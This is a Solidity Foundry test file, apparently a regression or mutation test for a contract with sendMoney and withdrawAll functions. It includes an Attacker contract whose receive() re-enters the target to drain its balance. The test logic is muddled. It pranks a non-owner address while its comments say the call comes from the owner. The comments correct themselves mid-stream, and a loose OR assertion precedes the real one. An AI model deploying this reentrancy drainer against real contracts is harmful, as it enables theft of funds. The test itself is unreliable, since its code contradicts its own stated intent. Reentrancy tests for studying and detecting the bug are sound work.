pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }
    function testRegression_property() public {
        // Deploy attacker contract that will reenter
        Attacker attacker = new Attacker(address(c));

        // Fund the contract with 1 ether for attack
        vm.deal(address(c), 1 ether);

        // Owner sends 1 wei to attacker, triggering reentrancy
        vm.prank(address(0x1)); // not owner, so sendMoney will revert unless we make sender owner
        // Actually, we need to set owner to address(this) for deployment, but we can prank the original owner
        // The contract's owner is this test contract (msg.sender in constructor)
        // So we call sendMoney as this test contract (owner)

        bool ok;
        try c.sendMoney(address(attacker), 1 wei) {
            ok = true;
        } catch {
            ok = false;
        }

        // In the reference contract, transfer uses 2300 gas - the reentrant call will fail
        // In the buggy contract, call forwards all gas - the reentrant call succeeds
        // After the transaction, reference contract still has 1 ether, buggy contract has 0
        assertTrue(c.depositsCount() > 0 || address(c).balance == 0); // This holds for bug (balance=0) but not reference (balance=1 ether)
        // Actually we need a precise difference: after sendMoney, the buggy contract's balance is 0, reference has 1 ether
        // The assertion: address(c).balance == 0 is true for buggy, false for reference
        assertTrue(address(c).balance == 0);
    }
}

contract Attacker {
    C c;
    constructor(address _c) { c = C(_c); }
    receive() external payable {
        // Attempt reentrancy: call withdrawAll to drain contract
        c.withdrawAll();
    }
}

